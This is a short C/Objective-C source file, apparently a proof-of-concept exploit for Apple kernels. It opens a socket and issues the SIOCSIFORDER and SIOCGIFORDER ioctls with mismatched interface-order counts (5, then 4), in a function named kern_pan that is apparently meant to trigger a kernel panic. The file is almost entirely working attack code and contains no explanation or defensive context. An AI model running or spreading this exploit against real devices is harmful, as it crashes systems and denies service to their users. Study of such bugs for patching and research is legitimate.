#import "panic.h"
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <mach/mach.h>

struct if_order {
    u_int32_t			ifo_count;
    u_int32_t			ifo_reserved;
    mach_vm_address_t	ifo_ordered_indices; /* array of u_int32_t */
};
#define SIOCSIFORDER  _IOWR('i', 178, struct if_order)
#define SIOCGIFORDER  _IOWR('i', 179, struct if_order)
void set(int fd, uint32_t n) {
    uint32_t* data = malloc(n*4096);
    for (int i = 0; i < n; i++) {
        data[i] = 1;
    }
    struct if_order ifo;
    ifo.ifo_count = n;
    ifo.ifo_reserved = 0;
    ifo.ifo_ordered_indices = (mach_vm_address_t)data;
    ioctl(fd, SIOCSIFORDER, &ifo);
    free(data);
}
void get(int fd, uint32_t n) {
    uint32_t* data = malloc(n*4096);
    memset(data, 0, n*4096);
    struct if_order ifo;
    ifo.ifo_count = n;
    ifo.ifo_reserved = 0;
    ifo.ifo_ordered_indices = (mach_vm_address_t)data;
    ioctl(fd, SIOCGIFORDER, &ifo);
    free(data);
}
int kern_pan() {
    int fd = socket(PF_INET, SOCK_STREAM, 0);
    set(fd, 5);
    get(fd, 4);
    return 0;
}
